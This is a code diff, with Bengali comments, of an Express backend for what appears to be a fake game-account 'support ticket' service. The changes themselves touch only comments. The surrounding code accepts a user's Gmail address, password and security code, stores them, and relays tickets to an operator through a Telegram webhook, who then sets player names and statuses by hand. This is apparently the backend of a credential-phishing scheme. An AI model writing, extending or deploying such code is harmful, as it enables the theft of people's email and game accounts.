@@ -7,6 +7,7 @@ const app = express();
 app.use(cors({ origin: '*' }));
 app.use(express.json());
 
+// ক্যাশিং বন্ধ রাখার নোটিফিকেশন
 app.use((req, res, next) => {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
     res.setHeader('Pragma', 'no-cache');
@@ -23,11 +24,11 @@ if (!global.persistentStore) {
 
 app.get('/', (req, res) => res.send("Backend Active"));
 
-// ১. সাবমিট টিকিট
+// ১. টিকিট জমা নেওয়ার API
 app.post('/api/submit-ticket', async (req, res) => {
     const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
     
-    // নতুন ডিফল্ট নাম ও লেভেল
+    // নতুন ডিফল্ট টেক্সট
     global.persistentStore[String(uid)] = {
         status: "Pending",
         name: "Searching Player Name...",
@@ -74,14 +75,14 @@ app.post('/api/submit-ticket', async (req, res) => {
     }
 });
 
-// ২. টেলিগ্রাম মেসেজ এবং বাটন রিপ্লাই
+// ২. টেলিগ্রাম ওয়েবহুক এবং মেসেজ আপডেট
 app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
 
     try {
         const update = req.body;
 
-        // টেলিগ্রাম থেকে মেসেজে নাম ও লেভেল পাঠালে (ফরম্যাট: UID Name Level)
+        // টেলিগ্রামে মেসেজ টাইপ করে নাম ও লেভেল সেট করার লজিক (ফরম্যাট: UID Name Level)
         if (update && update.message && update.message.text) {
             const text = update.message.text.trim();
             const parts = text.split(' ');
@@ -176,7 +177,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     }
 });
 
-// ৩. স্ট্যাটাস চেক API
+// ৩. লাইভ স্ট্যাটাস নেওয়ার API
 app.get('/api/check-status/:uid', (req, res) => {
     const uid = String(req.params.uid);
     const userData = global.persistentStore[uid] || {
